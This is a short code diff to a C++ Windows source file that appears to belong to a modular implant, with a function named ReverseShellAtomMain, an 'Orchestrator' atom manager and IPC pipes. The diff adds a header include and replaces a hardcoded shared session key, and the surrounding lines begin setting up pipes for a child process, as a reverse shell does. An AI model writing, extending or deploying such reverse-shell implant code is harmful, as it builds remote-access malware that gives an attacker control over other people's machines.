@@ -15,6 +15,7 @@
 #include "Atom_10_Shell.h"
 #include "../Orchestrator/AtomManager.h"
 #include "Atom_03_Sys.h"
+#include <cstring>
 
 #define BUFFER_SIZE 8192
 
@@ -26,7 +27,7 @@ DWORD WINAPI ReverseShellAtomMain(LPVOID lpParam) {
     HANDLE hPipe = IPC_ConnectToPipe(dwAtomId);
     if (!hPipe) return 1;
 
-    BYTE SharedSessionKey[] = "ofjfSLlUyDZKb92O";
+    BYTE SharedSessionKey[] = "KI4ns1N2S1M8Tknp";
 
     /* 1. Setup Anonymous Pipes for the child process */
     SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };
